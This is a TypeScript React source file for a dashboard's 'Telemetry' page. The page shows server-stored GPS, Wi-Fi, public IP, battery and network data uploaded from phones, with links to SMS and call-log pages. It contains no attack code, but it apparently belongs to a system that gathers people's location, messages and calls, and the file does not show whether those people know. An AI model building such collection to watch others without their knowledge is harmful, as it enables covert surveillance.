import { useEffect, useState, type FormEvent } from 'react'
import { Link } from 'react-router-dom'
import { Button } from '@/components/ui/button'
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card'
import { api } from '@/lib/api'

type Row = Awaited<ReturnType<typeof api.telemetry>>[number]
type Device = Awaited<ReturnType<typeof api.devices>>[number]
type Summary = Awaited<ReturnType<typeof api.summary>>

const KINDS = [
  '',
  'gps',
  'network_signal',
  'network_type',
  'battery',
  'wifi',
  'public_ip',
]

const TELEMETRY_LABELS: Record<string, string> = {
  gps: 'GPS',
  network_signal: 'Network signal',
  network_type: 'Network type',
  battery: 'Battery',
  wifi: 'Wi‑Fi',
  public_ip: 'Public IP',
}

export function TelemetryPage() {
  const [devices, setDevices] = useState<Device[]>([])
  const [deviceId, setDeviceId] = useState('')
  const [kind, setKind] = useState('')
  const [rows, setRows] = useState<Row[]>([])
  const [summary, setSummary] = useState<Summary | null>(null)
  const [error, setError] = useState<string | null>(null)

  function load(nextDeviceId = deviceId, nextKind = kind) {
    Promise.all([
      api.telemetry({
        deviceId: nextDeviceId || undefined,
        kind: nextKind || undefined,
      }),
      api.summary({ deviceId: nextDeviceId || undefined }),
    ])
      .then(([telemetryRows, summaryRows]) => {
        setRows(telemetryRows)
        setSummary(summaryRows)
      })
      .catch((e) => setError(e instanceof Error ? e.message : 'failed'))
  }

  useEffect(() => {
    api
      .devices()
      .then(setDevices)
      .catch((e) => setError(e instanceof Error ? e.message : 'failed'))
    load()
  }, [])

  function onFilter(e: FormEvent) {
    e.preventDefault()
    load()
  }

  function pickKind(nextKind: string) {
    setKind(nextKind)
    load(deviceId, nextKind)
  }

  const telemetryCounts = summary?.telemetry ?? {}
  const listedTotal =
    (summary?.sms ?? 0) +
    (summary?.calls ?? 0) +
    Object.values(telemetryCounts).reduce((a, b) => a + b, 0)

  return (
    <div className="space-y-4">
      <h1 className="font-mono text-2xl font-semibold">Telemetry</h1>
      <p className="text-sm text-muted-foreground">
        Phones upload eight channels: SMS and call logs have their own pages; the six sensor streams below
        appear here. Samples list shows up to 500 newest rows (use Kind filter so high‑frequency Wi‑Fi does
        not hide GPS or public IP).
      </p>
      {summary ? (
        <Card>
          <CardHeader>
            <CardTitle>Stored on server ({listedTotal.toLocaleString()} rows)</CardTitle>
          </CardHeader>
          <CardContent className="grid gap-2 sm:grid-cols-2 lg:grid-cols-4">
            <Link
              to="/sms"
              className="rounded-lg border border-border/70 bg-muted/40 px-3 py-2 text-sm hover:bg-muted"
            >
              <span className="font-medium">SMS</span>
              <span className="ml-2 font-mono text-muted-foreground">{summary.sms.toLocaleString()}</span>
            </Link>
            <Link
              to="/calls"
              className="rounded-lg border border-border/70 bg-muted/40 px-3 py-2 text-sm hover:bg-muted"
            >
              <span className="font-medium">Calls</span>
              <span className="ml-2 font-mono text-muted-foreground">{summary.calls.toLocaleString()}</span>
            </Link>
            {Object.keys(TELEMETRY_LABELS).map((k) => (
              <button
                key={k}
                type="button"
                className="rounded-lg border border-border/70 bg-muted/40 px-3 py-2 text-left text-sm hover:bg-muted"
                onClick={() => pickKind(k)}
              >
                <span className="font-medium">{TELEMETRY_LABELS[k]}</span>
                <span className="ml-2 font-mono text-muted-foreground">
                  {(telemetryCounts[k] ?? 0).toLocaleString()}
                </span>
              </button>
            ))}
          </CardContent>
        </Card>
      ) : null}
      <form onSubmit={onFilter} className="flex flex-col gap-2 sm:flex-row">
        <select
          aria-label="Device"
          className="min-h-11 rounded-md border border-input bg-background px-3 text-sm"
          value={deviceId}
          onChange={(e) => setDeviceId(e.target.value)}
        >
          <option value="">All devices</option>
          {devices.map((d) => (
            <option key={d.id} value={String(d.id)}>
              {d.label}
            </option>
          ))}
        </select>
        <select
          aria-label="Kind"
          className="min-h-11 rounded-md border border-input bg-background px-3 text-sm"
          value={kind}
          onChange={(e) => setKind(e.target.value)}
        >
          {KINDS.map((k) => (
            <option key={k || 'all'} value={k}>
              {k ? TELEMETRY_LABELS[k] ?? k : 'All kinds'}
            </option>
          ))}
        </select>
        <Button type="submit">Filter</Button>
      </form>
      {error ? <p className="text-destructive">{error}</p> : null}
      <Card>
        <CardHeader>
          <CardTitle>
            Samples ({rows.length}
            {rows.length >= 500 ? ', cap reached' : ''})
          </CardTitle>
        </CardHeader>
        <CardContent className="space-y-3">
          {rows.length === 0 ? (
            <p className="text-muted-foreground">No telemetry stored yet.</p>
          ) : (
            rows.map((r) => (
              <article key={r.id} className="rounded-lg border border-border/70 bg-muted/40 p-3">
                <div className="mb-1 flex flex-wrap items-center gap-2 text-xs text-muted-foreground">
                  <span className="font-medium text-foreground">{r.kind}</span>
                  <span>{r.deviceLabel}</span>
                  <span>{r.recordedAt}</span>
                </div>
                <pre className="overflow-x-auto whitespace-pre-wrap font-mono text-xs">
                  {JSON.stringify(r.payload, null, 2)}
                </pre>
              </article>
            ))
          )}
        </CardContent>
      </Card>
    </div>
  )
}